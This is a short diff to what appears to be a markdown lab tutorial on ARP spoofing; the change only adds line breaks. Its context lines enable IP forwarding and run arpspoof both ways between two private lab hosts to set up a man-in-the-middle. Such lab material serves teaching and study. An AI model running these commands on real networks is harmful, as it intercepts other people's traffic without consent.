@@ -148,7 +148,9 @@ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
 Terminal 1 & 2:
 
 sudo arpspoof -i eth0 -t 192.168.244.128 192.168.244.131
+<br>
 & 
+<br>
 sudo arpspoof -i eth0 -t 192.168.244.131 192.168.244.128
 <br>
 <br>
